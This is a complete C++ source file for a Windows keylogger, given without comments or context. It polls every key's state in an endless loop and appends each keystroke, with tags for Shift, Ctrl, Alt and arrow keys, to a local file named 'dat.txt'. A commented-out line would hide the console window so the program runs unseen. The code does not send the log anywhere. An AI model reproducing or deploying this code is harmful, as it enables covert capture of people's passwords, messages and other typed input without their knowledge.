#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool parseUnprintable(int S_key) {
	switch (S_key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_key");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_key");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_key");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_key");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default: 
		return false;
	}
}



int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(10);
		for (int key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (parseUnprintable(key) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(key);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
